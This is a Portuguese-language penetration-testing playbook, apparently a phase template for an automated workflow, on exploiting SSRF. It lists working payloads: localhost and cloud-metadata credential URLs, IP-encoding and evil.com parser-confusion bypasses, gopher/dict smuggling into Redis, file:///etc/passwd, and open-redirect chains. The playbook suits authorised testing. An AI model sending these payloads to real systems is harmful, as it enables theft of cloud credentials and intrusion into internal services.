# Fase 4e: Exploração — SSRF
## Target: {{TARGET}}

> Baseado em: Shannon `exploit-ssrf.txt`
> Input: Fila de `deliverables/03e_vuln_ssrf.md`
> Output: `deliverables/04e_exploit_ssrf.md`

---

## ⚠️ Contexto: Perguntar antes de executar
> Antes de iniciar esta fase, confirmar: **HTB/CTF** ou **Real/Autorizado**?
> Isso determina quais ferramentas e técnicas são aplicáveis.

## Papel
Penetration tester de SSRF. Provar bypass de fronteira de rede e acesso a serviços internos.

## Níveis de Prova
| Nível | Descrição | Classificação |
|-------|-----------|---------------|
| 1 | Acesso teórico identificado | POTENTIAL (Low) |
| 2 | Request outbound confirmado (timing/blind) | POTENTIAL (Medium) |
| 3 | **Acesso a serviço interno confirmado** | **EXPLOITED** |
| 4 | **Dados sensíveis internos recuperados** (metadata, creds) | **EXPLOITED (CRITICAL)** |

## 2-Stage Workflow

### Stage 1: Confirmação & Acesso
- [ ] Executar `suggested_exploit_technique` da análise
- [ ] Testar acesso a serviços internos:
  ```
  http://127.0.0.1:PORT/
  http://localhost:PORT/
  http://[::1]:PORT/
  ```

### Stage 2: Demonstração de Impacto
- [ ] Cloud metadata:
  ```
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```
- [ ] Serviços internos:
  ```
  http://127.0.0.1:8080/admin
  http://127.0.0.1:6379/  (Redis)
  http://127.0.0.1:3306/  (MySQL)
  ```
- [ ] Port scanning interno:
  ```python
  for port in [22, 80, 443, 3306, 5432, 6379, 8080, 9200]:
      # testar cada porta via SSRF
  ```

## Técnicas de Bypass

### URL Parsing/Validation Bypass
```
http://127.0.0.1:80@evil.com/        # @ confusion
http://evil.com#@127.0.0.1/          # fragment confusion
http://127.0.0.1%00@evil.com/        # null byte
http://0x7f000001/                    # hex IP
http://2130706433/                    # decimal IP
http://017700000001/                  # octal IP
http://127.1/                         # short form
```

### DNS Rebinding
```
# Domínio que resolve para 127.0.0.1
http://spoofed.burpcollaborator.net/
http://1271-0-0-1.nip.io/
```

### Protocol Smuggling
```
gopher://127.0.0.1:6379/_SET%20key%20value
dict://127.0.0.1:6379/SET:key:value
file:///etc/passwd
```

### Redirect Chain
```
# Usar open redirect para bypass de allowlist
http://{{TARGET}}/redirect?url=http://127.0.0.1:8080/admin
```

## Validação
- Classic SSRF: conteúdo do response retornado → verificar conteúdo
- Blind SSRF: usar collaborator/webhook.site → verificar log
- Semi-blind: comparar erros para IPs internos vs externos
- Time-based: comparar latência para portas abertas vs fechadas

## Deliverable → `deliverables/04e_exploit_ssrf.md`
